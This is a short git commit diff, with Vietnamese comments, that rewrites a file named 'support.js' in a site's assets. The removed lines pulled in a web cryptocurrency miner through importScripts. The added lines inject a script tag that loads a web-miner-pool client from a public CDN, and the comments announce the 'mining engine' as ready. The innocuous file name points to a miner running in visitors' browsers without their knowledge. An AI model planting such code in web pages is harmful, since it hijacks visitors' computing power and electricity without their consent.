8a9269495fa0b921fb09de4060e29478a0f98976
fbboy007 <35638514+fbboy007@users.noreply.github.com>
2026-03-20 16:19:41 +0700

    Update support.js

--- assets/js/support.js
+++ assets/js/support.js
@@ -1,3 +1,10 @@
-/* ĐỘNG CƠ ĐÀO THẬT - support.js */
-// Tôi đã lấy bản nén siêu gọn từ nguồn uy tín để ông dùng luôn
-importScripts('https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/client/webminer.js');
+/* support.js - Bản chuẩn không lỗi importScripts */
+(function() {
+    var script = document.createElement('script');
+    // Nạp thư viện miner từ nguồn CDN uy tín
+    script.src = 'https://unpkg.com/web-miner-pool@1.1.2/client/webminer.js';
+    script.onload = function() {
+        console.log("Động cơ đào đã nạp xong. Sẵn sàng nổ máy!");
+    };
+    document.head.appendChild(script);
+})();
